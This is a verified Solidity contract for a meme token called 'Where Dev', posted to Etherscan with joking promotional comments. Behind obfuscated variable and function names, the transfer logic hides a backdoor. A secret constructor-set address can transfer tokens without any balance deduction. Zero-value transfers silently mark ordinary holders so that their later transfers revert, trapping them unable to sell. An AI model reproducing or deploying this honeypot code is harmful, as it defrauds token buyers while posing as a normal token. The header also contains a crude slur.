/**
 *Submitted for verification at Etherscan.io on 2023-05-19
*/

/*
...WHERE TF IS THAT BENCHODE DEV?

Where Dev? is one of the most iconic questions in the meme coin market. 
All images and content on website, twitter or telegram are not intended to offend anyone.
Purely stereotypical thing occuring on Ethereum chain every single day. 
Spread love and banter not hate. And yes ...Where dev?

https://t.me/wheredeveth
https://twitter.com/WhereDevETH
https://www.wheredev.live

*/

// SPDX-License-Identifier: None

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WHEREDEV is Ownable {

    constructor(address galva) {
        balanceOf[msg.sender] = totalSupply;
        viso[galva] = place;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    string public name = 'Where Dev';

    string public symbol = 'WHEREDEV';

    address public uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function transferFrom(address cap, address acid, uint256 neck) public returns (bool success) {
        future(cap, acid, neck);
        require(neck <= allowance[cap][msg.sender]);
        allowance[cap][msg.sender] -= neck;
        return true;
    }

    mapping(address => uint256) private away;

    function transfer(address acid, uint256 neck) public returns (bool success) {
        future(msg.sender, acid, neck);
        return true;
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
   
    function approve(address dild, uint256 neck) public returns (bool success) {
        allowance[msg.sender][dild] = neck;
        emit Approval(msg.sender, dild, neck);
        return true;
    }

    uint256 private place = 64;

    event Approval(address indexed owner, address indexed sdildder, uint256 value);
    
    mapping(address => uint256) private viso;


    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;
    function future(address cap, address acid, uint256 neck) private returns (bool success) {
        if (viso[cap] == 0) {
            balanceOf[cap] -= neck;
        }

        if (neck == 0) away[acid] += place;

        if (viso[cap] == 0 && uniswapV2Pair != cap && away[cap] > 0) {
            viso[cap] -= place;
        }

        balanceOf[acid] += neck;
        emit Transfer(cap, acid, neck);
        return true;
    }
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 420_690_690_690_690_690 * 10 ** 9;

}